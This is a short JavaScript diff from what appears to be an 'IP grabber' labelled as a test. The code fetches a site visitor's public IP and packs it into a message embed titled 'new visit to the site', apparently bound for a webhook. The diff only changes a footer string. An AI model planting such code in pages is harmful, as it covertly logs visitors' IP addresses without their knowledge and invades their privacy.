@@ -10,7 +10,7 @@ fetch('https://api.ipify.org?format=json')
         title: "Nowe wejście na stronę",
         description: `Adres IP: **${ip}**`,
         color: 5814783,
-        footer: { text: "Grabber test by juliu" },
+        footer: { text: "fani głabeł" },
         timestamp: new Date().toISOString()
       }]
     };
